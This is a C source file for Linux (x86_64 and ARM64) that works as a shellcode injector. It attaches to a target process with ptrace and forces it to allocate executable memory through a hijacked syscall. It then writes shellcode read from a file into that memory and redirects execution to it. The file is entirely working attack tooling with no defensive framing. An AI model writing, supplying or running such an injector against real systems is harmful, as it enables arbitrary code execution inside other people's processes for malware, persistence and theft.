#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>

#if defined(__aarch64__)
#define ARCH_ARM64 1
#else
#define ARCH_X86_64 1
#endif

void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

unsigned char *read_shellcode(const char *filename, size_t *size_out) {
    FILE *f = fopen(filename, "rb");
    if (!f) die("Failed to open shellcode file");

    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    rewind(f);

    unsigned char *buf = malloc(size);
    if (!buf) die("malloc failed");

    fread(buf, 1, size, f);
    fclose(f);

    *size_out = size;
    return buf;
}

long call_remote_syscall(pid_t pid, long syscall_num, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
#if ARCH_X86_64
    struct user_regs_struct regs, orig_regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) die("getregs");

    memcpy(&orig_regs, &regs, sizeof(regs));

    regs.rax = syscall_num;
    regs.rdi = arg1;
    regs.rsi = arg2;
    regs.rdx = arg3;
    regs.r10 = arg4;
    regs.r8  = arg5;
    regs.r9  = arg6;
    regs.rip -= 2;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) die("setregs");

    unsigned long backup = ptrace(PTRACE_PEEKTEXT, pid, regs.rip, NULL);
    ptrace(PTRACE_POKETEXT, pid, regs.rip, 0x050f); // syscall

    ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
    waitpid(pid, NULL, 0);

    long result = ptrace(PTRACE_PEEKUSER, pid, 8 * RAX, NULL);

    ptrace(PTRACE_POKETEXT, pid, regs.rip, backup);
    ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
    return result;

#elif ARCH_ARM64
    struct iovec iov = {0};
    struct user_pt_regs regs = {0}, backup_regs = {0};

    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);

    if (ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov) < 0) die("getregset");
    memcpy(&backup_regs, &regs, sizeof(regs));

    regs.regs[8] = syscall_num;
    regs.regs[0] = arg1;
    regs.regs[1] = arg2;
    regs.regs[2] = arg3;
    regs.regs[3] = arg4;
    regs.regs[4] = arg5;
    regs.regs[5] = arg6;
    regs.pc -= 4;

    if (ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov) < 0) die("setregset");

    uint32_t svc = 0xd4000001;
    uint32_t backup = ptrace(PTRACE_PEEKTEXT, pid, regs.pc, NULL);
    ptrace(PTRACE_POKETEXT, pid, regs.pc, svc);

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, NULL, 0);

    ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov);
    long result = regs.regs[0];

    ptrace(PTRACE_POKETEXT, pid, regs.pc, backup);
    ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &backup_regs);
    return result;
#endif
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <pid> <shellcode.bin>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    const char *shellcode_file = argv[2];
    size_t shellcode_size = 0;
    unsigned char *shellcode = read_shellcode(shellcode_file, &shellcode_size);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
        die("ptrace_attach");

    waitpid(pid, NULL, 0);
    printf("[+] Attached to PID %d\n", pid);

    long mmap_addr = call_remote_syscall(
        pid,
        __NR_mmap,
        0,
        4096,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    );

    if (mmap_addr == -1) {
        fprintf(stderr, "[-] mmap failed in remote process\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }

    printf("[+] Allocated memory at: 0x%lx\n", mmap_addr);

    // Inject shellcode
    for (size_t i = 0; i < shellcode_size; i += sizeof(long)) {
        long chunk = 0;
        memcpy(&chunk, shellcode + i, sizeof(long));
        if (ptrace(PTRACE_POKETEXT, pid, mmap_addr + i, chunk) == -1)
            die("injecting shellcode");
    }

    // Redirect PC to shellcode
#if ARCH_X86_64
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    regs.rip = mmap_addr;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
#elif ARCH_ARM64
    struct iovec iov;
    struct user_pt_regs regs;
    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);
    ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov);
    regs.pc = mmap_addr;
    ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov);
#endif

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    printf("[+] Shellcode executed!\n");

    free(shellcode);
    return 0;
}
